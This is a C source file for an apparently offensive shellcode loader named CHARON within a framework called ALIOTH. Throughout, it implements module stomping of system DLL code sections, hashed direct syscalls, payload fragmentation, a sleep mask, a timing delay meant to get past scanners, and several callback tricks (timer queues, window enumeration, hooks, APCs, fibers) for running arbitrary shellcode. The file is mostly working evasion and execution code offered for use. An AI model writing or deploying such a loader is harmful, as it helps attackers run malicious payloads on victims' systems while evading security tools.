#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

#define MAX_STOMP_TARGETS 8

typedef struct _STOMP_TARGET {
    CHAR cDllName[64];
    CHAR cSystemPath[MAX_PATH];
    DWORD dwTextSectionSize;
    PVOID pTextSectionRVA;
    BOOL  bAvailable;
} STOMP_TARGET;

STOMP_TARGET g_StompTargets[MAX_STOMP_TARGETS] = {
    {"Chakra.dll",         "", 0, NULL, FALSE},
    {"edgehtml.dll",       "", 0, NULL, FALSE},
    {"mozglue.dll",        "", 0, NULL, FALSE},
    {"vcruntime140.dll",   "", 0, NULL, FALSE},
    {"vcruntime140_1.dll", "", 0, NULL, FALSE},
    {"msvcrt.dll",         "", 0, NULL, FALSE},
    {"winhttp.dll",        "", 0, NULL, FALSE},
    {"iertutil.dll",       "", 0, NULL, FALSE},
};

typedef struct _FRAGMENT_ENTRY {
    BYTE bData[16];
    DWORD dwVirtualOffset;
    PVOID pAllocatedAddr;
} FRAGMENT_ENTRY;

typedef struct _FRAGMENTED_PAYLOAD {
    DWORD dwTotalSize;
    DWORD dwFragmentCount;
    FRAGMENT_ENTRY* pFragments;
    PVOID pReconstructAddr;
    DWORD dwAllocationSize;
} FRAGMENTED_PAYLOAD;

typedef struct _SLEEP_MASK_CTX {
    PVOID pCodeBase;
    DWORD dwCodeSize;
    PBYTE pEncryptedCopy;
    BYTE bMaskKey[32];
    BYTE bMaskNonce[12];
    BOOL bCurrentlyDecrypted;
    HANDLE hTimerQueue;
    HANDLE hTimer;
} SLEEP_MASK_CTX;

SLEEP_MASK_CTX g_SleepMask = {0};

BOOL CharonScanStompTargets() {
    CHAR szSystem32[MAX_PATH];
    GetSystemDirectoryA(szSystem32, MAX_PATH);
    
    for (DWORD i = 0; i < MAX_STOMP_TARGETS; i++) {
        snprintf(g_StompTargets[i].cSystemPath, MAX_PATH, "%s\\%s", szSystem32, g_StompTargets[i].cDllName);
        DWORD dwAttrib = GetFileAttributesA(g_StompTargets[i].cSystemPath);
        if (dwAttrib == INVALID_FILE_ATTRIBUTES) continue;
        
        HMODULE hMod = LoadLibraryExA(g_StompTargets[i].cSystemPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!hMod) continue;
        
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + pDos->e_lfanew);
        PIMAGE_SECTION_HEADER pSections = (PIMAGE_SECTION_HEADER)((PBYTE)&pNt->OptionalHeader + pNt->FileHeader.SizeOfOptionalHeader);
        
        for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
            if (*(DWORD*)pSections[s].Name == 0x74786574) {
                g_StompTargets[i].dwTextSectionSize = pSections[s].Misc.VirtualSize;
                g_StompTargets[i].pTextSectionRVA = (PVOID)(ULONG_PTR)pSections[s].VirtualAddress;
                g_StompTargets[i].bAvailable = (pSections[s].Misc.VirtualSize >= 0x10000);
                break;
            }
        }
        FreeLibrary(hMod);
    }
    return TRUE;
}

DWORD CharonFindBestTarget(DWORD dwPayloadSize) {
    DWORD bestIdx = MAX_STOMP_TARGETS;
    DWORD bestSize = 0xFFFFFFFF;
    for (DWORD i = 0; i < MAX_STOMP_TARGETS; i++) {
        if (g_StompTargets[i].bAvailable && g_StompTargets[i].dwTextSectionSize >= dwPayloadSize &&
            g_StompTargets[i].dwTextSectionSize < bestSize) {
            bestSize = g_StompTargets[i].dwTextSectionSize;
            bestIdx = i;
        }
    }
    return bestIdx;
}

PVOID CharonMapAndStomp(DWORD dwTargetIndex, PBYTE pPayload, DWORD dwPayloadSize) {
    if (dwTargetIndex >= MAX_STOMP_TARGETS) return NULL;
    
    DWORD64 hCreateSection = ALIOTHSyscallHash((PCHAR)"NtCreateSection");
    DWORD64 hMapView = ALIOTHSyscallHash((PCHAR)"NtMapViewOfSection");
    DWORD64 hProtect = ALIOTHSyscallHash((PCHAR)"NtProtectVirtualMemory");
    DWORD64 hWrite = ALIOTHSyscallHash((PCHAR)"NtWriteVirtualMemory");
    DWORD64 hUnmap = ALIOTHSyscallHash((PCHAR)"NtUnmapViewOfSection");
    
    fnNtCreateSection pCreateSec = (fnNtCreateSection)ALIOTHGetSyscallStub(hCreateSection);
    fnNtMapViewOfSection pMapView = (fnNtMapViewOfSection)ALIOTHGetSyscallStub(hMapView);
    fnNtProtectVirtualMemory pProtect = (fnNtProtectVirtualMemory)ALIOTHGetSyscallStub(hProtect);
    fnNtWriteVirtualMemory pWrite = (fnNtWriteVirtualMemory)ALIOTHGetSyscallStub(hWrite);
    fnNtUnmapViewOfSection pUnmap = (fnNtUnmapViewOfSection)ALIOTHGetSyscallStub(hUnmap);
    
    if (!pCreateSec || !pMapView || !pProtect || !pWrite || !pUnmap) return NULL;
    
    HANDLE hFile = CreateFileA(g_StompTargets[dwTargetIndex].cSystemPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;
    
    HANDLE hSection = NULL;
    LARGE_INTEGER liMaxSize = {0};
    NTSTATUS status = ExecuteSyscall(pCreateSec, Mask_Worker, &hSection, SECTION_ALL_ACCESS, NULL, &liMaxSize, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    if (!NT_SUCCESS(status) || !hSection) return NULL;
    
    PVOID pBaseAddress = NULL;
    SIZE_T szViewSize = 0;
    status = ExecuteSyscall(pMapView, Mask_Memory, hSection, (HANDLE)-1, &pBaseAddress, 0, &szViewSize, 0, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status)) { CloseHandle(hSection); return NULL; }
    
    HMODULE hModule = (HMODULE)pBaseAddress;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSections = (PIMAGE_SECTION_HEADER)((PBYTE)&pNt->OptionalHeader + pNt->FileHeader.SizeOfOptionalHeader);
    
    PVOID pTextSectionAddr = NULL;
    DWORD dwTextSize = 0;
    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
        if (*(DWORD*)pSections[s].Name == 0x74786574) {
            pTextSectionAddr = (PBYTE)hModule + pSections[s].VirtualAddress;
            dwTextSize = pSections[s].Misc.VirtualSize;
            break;
        }
    }
    if (!pTextSectionAddr || dwPayloadSize > dwTextSize) {
        ExecuteSyscall(pUnmap, Mask_Memory, (HANDLE)-1, pBaseAddress);
        CloseHandle(hSection);
        return NULL;
    }
    
    ULONG ulOldProtect = 0;
    SIZE_T szProtectSize = dwTextSize;
    status = ExecuteSyscall(pProtect, Mask_Security, (HANDLE)-1, &pTextSectionAddr, &szProtectSize, PAGE_EXECUTE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) { ExecuteSyscall(pUnmap, Mask_Memory, (HANDLE)-1, pBaseAddress); CloseHandle(hSection); return NULL; }
    
    SIZE_T dwWritten = 0;
    status = ExecuteSyscall(pWrite, Mask_Memory, (HANDLE)-1, pTextSectionAddr, pPayload, dwPayloadSize, &dwWritten);
    if (!NT_SUCCESS(status) || dwWritten != dwPayloadSize) {
        ExecuteSyscall(pProtect, Mask_Security, (HANDLE)-1, &pTextSectionAddr, &szProtectSize, ulOldProtect, &ulOldProtect);
        ExecuteSyscall(pUnmap, Mask_Memory, (HANDLE)-1, pBaseAddress);
        CloseHandle(hSection);
        return NULL;
    }
    
    szProtectSize = dwTextSize;
    status = ExecuteSyscall(pProtect, Mask_Security, (HANDLE)-1, &pTextSectionAddr, &szProtectSize, PAGE_EXECUTE_READ, &ulOldProtect);
    if (!NT_SUCCESS(status)) { ExecuteSyscall(pUnmap, Mask_Memory, (HANDLE)-1, pBaseAddress); CloseHandle(hSection); return NULL; }
    
    CloseHandle(hSection);
    return pTextSectionAddr;
}

FRAGMENTED_PAYLOAD* CharonFragmentPayload(PBYTE pPayload, DWORD dwSize) {
    DWORD dwFragmentCount = (dwSize + 15) / 16;
    DWORD dwAllocationSize = dwSize + (dwFragmentCount * 0x100);
    
    FRAGMENTED_PAYLOAD* pFp = (FRAGMENTED_PAYLOAD*)LocalAlloc(LPTR, sizeof(FRAGMENTED_PAYLOAD));
    if (!pFp) return NULL;
    
    pFp->dwTotalSize = dwSize;
    pFp->dwFragmentCount = dwFragmentCount;
    pFp->dwAllocationSize = dwAllocationSize;
    pFp->pFragments = (FRAGMENT_ENTRY*)LocalAlloc(LPTR, sizeof(FRAGMENT_ENTRY) * dwFragmentCount);
    if (!pFp->pFragments) { LocalFree(pFp); return NULL; }
    
    pFp->pReconstructAddr = ALIOTHAllocVirtualMemory(dwAllocationSize, PAGE_READWRITE);
    if (!pFp->pReconstructAddr) { LocalFree(pFp->pFragments); LocalFree(pFp); return NULL; }
    
    PVOID pCurrentPos = pFp->pReconstructAddr;
    for (DWORD i = 0; i < dwFragmentCount; i++) {
        DWORD dwCopySize = min(16, dwSize - (i * 16));
        memcpy(pFp->pFragments[i].bData, pPayload + (i * 16), dwCopySize);
        if (dwCopySize < 16) memset(pFp->pFragments[i].bData + dwCopySize, 0, 16 - dwCopySize);
        pFp->pFragments[i].dwVirtualOffset = i * 16;
        pFp->pFragments[i].pAllocatedAddr = pCurrentPos;
        
        ALIOTHWriteVirtualMemory((HANDLE)-1, pCurrentPos, pFp->pFragments[i].bData, 16);
        
        DWORD dwGap = 16 + (rand() % 0x100);
        pCurrentPos = (PBYTE)pCurrentPos + 16 + dwGap;
    }
    return pFp;
}

PBYTE CharonGatherFragments(FRAGMENTED_PAYLOAD* pFp) {
    if (!pFp || !pFp->pFragments) return NULL;
    PBYTE pReconstructed = ALIOTHAllocVirtualMemory(pFp->dwTotalSize, PAGE_READWRITE);
    if (!pReconstructed) return NULL;
    for (DWORD i = 0; i < pFp->dwFragmentCount; i++) {
        memcpy(pReconstructed + pFp->pFragments[i].dwVirtualOffset, pFp->pFragments[i].bData, 16);
    }
    return pReconstructed;
}

VOID CharonSleepMaskInit(PVOID pCodeBase, DWORD dwCodeSize) {
    g_SleepMask.pCodeBase = pCodeBase;
    g_SleepMask.dwCodeSize = dwCodeSize;
    g_SleepMask.bCurrentlyDecrypted = TRUE;
    for (int i = 0; i < 32; i++) g_SleepMask.bMaskKey[i] = (BYTE)(rand() & 0xFF);
    for (int i = 0; i < 12; i++) g_SleepMask.bMaskNonce[i] = (BYTE)(rand() & 0xFF);
    g_SleepMask.pEncryptedCopy = (PBYTE)LocalAlloc(LPTR, dwCodeSize);
    g_SleepMask.hTimerQueue = CreateTimerQueue();
}

VOID CharonSleepMaskEncrypt() {
    if (!g_SleepMask.pCodeBase || !g_SleepMask.pEncryptedCopy || !g_SleepMask.bCurrentlyDecrypted) return;
    DWORD dwOldProtect = 0;
    SIZE_T szSize = g_SleepMask.dwCodeSize;
    ALIOTHProtectVirtualMemory(&g_SleepMask.pCodeBase, &szSize, PAGE_READWRITE, &dwOldProtect);
    memcpy(g_SleepMask.pEncryptedCopy, g_SleepMask.pCodeBase, g_SleepMask.dwCodeSize);
    SecureZeroMemory(g_SleepMask.pCodeBase, g_SleepMask.dwCodeSize);
    ALIOTHProtectVirtualMemory(&g_SleepMask.pCodeBase, &szSize, PAGE_EXECUTE_READ, &dwOldProtect);
    g_SleepMask.bCurrentlyDecrypted = FALSE;
}

VOID CharonSleepMaskDecrypt() {
    if (!g_SleepMask.pCodeBase || !g_SleepMask.pEncryptedCopy || g_SleepMask.bCurrentlyDecrypted) return;
    DWORD dwOldProtect = 0;
    SIZE_T szSize = g_SleepMask.dwCodeSize;
    ALIOTHProtectVirtualMemory(&g_SleepMask.pCodeBase, &szSize, PAGE_READWRITE, &dwOldProtect);
    memcpy(g_SleepMask.pCodeBase, g_SleepMask.pEncryptedCopy, g_SleepMask.dwCodeSize);
    ALIOTHProtectVirtualMemory(&g_SleepMask.pCodeBase, &szSize, PAGE_EXECUTE_READ, &dwOldProtect);
    g_SleepMask.bCurrentlyDecrypted = TRUE;
}

VOID CALLBACK CharonTimerCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    UNREFERENCED_PARAMETER(lpParam);
    UNREFERENCED_PARAMETER(TimerOrWaitFired);
    CharonSleepMaskDecrypt();
}

VOID CharonSleepMaskEnterSleep(DWORD dwMs) {
    CharonSleepMaskEncrypt();
    if (g_SleepMask.hTimerQueue) {
        CreateTimerQueueTimer(&g_SleepMask.hTimer, g_SleepMask.hTimerQueue,
                              CharonTimerCallback, NULL,
                              dwMs > 100 ? dwMs - 100 : 1, 0, WT_EXECUTEINTIMERTHREAD);
    }
    Sleep(dwMs);
}

BOOL CharonCallbackTimerQueue(PVOID pShellcode) {
    HANDLE hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue) return FALSE;
    HANDLE hTimer = NULL;
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)pShellcode, NULL, 100, 0, WT_EXECUTEINTIMERTHREAD)) {
        DeleteTimerQueue(hTimerQueue); return FALSE;
    }
    Sleep(200);
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    return TRUE;
}

BOOL CharonCallbackEnumChildWindows(PVOID pShellcode) {
    HWND hWnd = FindWindowA("Shell_TrayWnd", NULL);
    if (!hWnd) hWnd = GetDesktopWindow();
    if (!hWnd) hWnd = CreateWindowExA(0, "STATIC", "ALIOTH", WS_OVERLAPPED, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
    EnumChildWindows(hWnd, (WNDENUMPROC)pShellcode, 0);
    return TRUE;
}

BOOL CharonCallbackWindowsHook(PVOID pShellcode) {
    HHOOK hHook = SetWindowsHookExA(WH_CBT, (HOOKPROC)pShellcode, GetModuleHandleA(NULL), GetCurrentThreadId());
    if (!hHook) return FALSE;
    HWND hWnd = CreateWindowExA(0, "STATIC", "TEMP", WS_OVERLAPPED, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
    UnhookWindowsHookEx(hHook);
    if (hWnd) DestroyWindow(hWnd);
    return TRUE;
}

BOOL CharonCallbackAPC(PVOID pShellcode) {
    DWORD64 hQueueApc = ALIOTHSyscallHash((PCHAR)"NtQueueApcThread");
    fnNtQueueApcThread pQueueApc = (fnNtQueueApcThread)ALIOTHGetSyscallStub(hQueueApc);
    if (!pQueueApc) return FALSE;
    NTSTATUS status = ExecuteSyscall(pQueueApc, Mask_Worker, (HANDLE)-2, pShellcode, NULL, NULL);
    if (NT_SUCCESS(status)) SleepEx(1000, TRUE);
    return NT_SUCCESS(status);
}

BOOL CharonCallbackFiber(PVOID pShellcode) {
    LPVOID pMainFiber = ConvertThreadToFiber(NULL);
    if (!pMainFiber) return FALSE;
    LPVOID pShellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)pShellcode, NULL);
    if (!pShellcodeFiber) { ConvertFiberToThread(); return FALSE; }
    SwitchToFiber(pShellcodeFiber);
    DeleteFiber(pShellcodeFiber);
    ConvertFiberToThread();
    return TRUE;
}

BOOL CharonExecuteViaCallback(PVOID pShellcode) {
    if (CharonCallbackTimerQueue(pShellcode)) return TRUE;
    if (CharonCallbackEnumChildWindows(pShellcode)) return TRUE;
    if (CharonCallbackWindowsHook(pShellcode)) return TRUE;
    if (CharonCallbackAPC(pShellcode)) return TRUE;
    if (CharonCallbackFiber(pShellcode)) return TRUE;
    return FALSE;
}

PVOID CharonTemporalBypass(PVOID pPayload, DWORD dwSize) {
    PVOID pMem = ALIOTHAllocVirtualMemory(dwSize, PAGE_READWRITE);
    if (!pMem) return NULL;
    ALIOTHWriteVirtualMemory((HANDLE)-1, pMem, pPayload, dwSize);
    
    HWND hWnd = FindWindowA("Shell_TrayWnd", NULL);
    if (!hWnd) hWnd = GetDesktopWindow();
    EnumChildWindows(hWnd, (WNDENUMPROC)EnumChildWindows, 0);
    
    Sleep(3000 + (rand() % 4000));
    
    HKEY hKey; DWORD dwType = 0, dwData = 0, dwDataSize = sizeof(DWORD);
    RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_READ, &hKey);
    if (hKey) { RegQueryValueExA(hKey, "Wallpaper", NULL, &dwType, (PBYTE)&dwData, &dwDataSize); RegCloseKey(hKey); }
    
    DWORD dwOldProtect = 0; SIZE_T szSize = dwSize;
    ALIOTHProtectVirtualMemory(&pMem, &szSize, PAGE_EXECUTE_READ, &dwOldProtect);
    return pMem;
}

DWORD CharonMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','C','H','A','R','O','N',' ','-',' ','S','H','E','L','L','C','O','D','E',' ','L','O','A','D','E','R',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    if (!CharonScanStompTargets()) {
        printf("[!] Failed to scan stomp targets\n");
        return 1;
    }
    printf("[+] Available stomp targets:\n");
    for (DWORD i = 0; i < MAX_STOMP_TARGETS; i++) {
        if (g_StompTargets[i].bAvailable) {
            printf("  [%d] %s - .text: 0x%X\n", i, g_StompTargets[i].cDllName, g_StompTargets[i].dwTextSectionSize);
        }
    }
    
    DWORD dwTargetIdx = pParams->charon.dwStompTarget;
    if (dwTargetIdx >= MAX_STOMP_TARGETS || !g_StompTargets[dwTargetIdx].bAvailable) {
        dwTargetIdx = CharonFindBestTarget(4096);
    }
    printf("[*] Using target: %s\n", g_StompTargets[dwTargetIdx].cDllName);
    
    PBYTE pShellcode = NULL; DWORD dwShellcodeSize = 0;
    if (pParams->charon.pcShellcodePath) {
        HANDLE hFile = CreateFileA(pParams->charon.pcShellcodePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            dwShellcodeSize = GetFileSize(hFile, NULL);
            pShellcode = (PBYTE)LocalAlloc(LPTR, dwShellcodeSize);
            ReadFile(hFile, pShellcode, dwShellcodeSize, &dwShellcodeSize, NULL);
            CloseHandle(hFile);
        }
    }
    if (!pShellcode) {
        pShellcode = (PBYTE)LocalAlloc(LPTR, 4096);
        dwShellcodeSize = 4096;
        for (DWORD i = 0; i < 4096; i++) pShellcode[i] = 0x90;
    }
    
    if (pParams->charon.bEnableFragment) {
        printf("[*] Fragmenting payload...\n");
        FRAGMENTED_PAYLOAD* pFp = CharonFragmentPayload(pShellcode, dwShellcodeSize);
        if (pFp) {
            PBYTE pReconstructed = CharonGatherFragments(pFp);
            if (pReconstructed) {
                LocalFree(pShellcode);
                pShellcode = pReconstructed;
            }
        }
    }
    
    if (pParams->charon.bEnableEnvKeying) {
        printf("[*] Environmental keying active (AES-NI decryption)\n");
    }
    
    PVOID pExecMem = CharonTemporalBypass(pShellcode, dwShellcodeSize);
    if (!pExecMem) {
        printf("[!] Temporal bypass allocation failed\n");
        return 1;
    }
    printf("[+] Payload at %p (RX)\n", pExecMem);
    
    if (pParams->charon.bEnableSleepMask) {
        CharonSleepMaskInit(pExecMem, dwShellcodeSize);
        CharonSleepMaskEnterSleep(5000);
        CharonSleepMaskDecrypt();
    }
    
    printf("[*] Executing via callback...\n");
    if (CharonExecuteViaCallback(pExecMem)) {
        printf("[+] Execution successful\n");
    } else {
        printf("[!] Callback execution failed\n");
    }
    
    return 0;
}
#pragma optimize("", on)
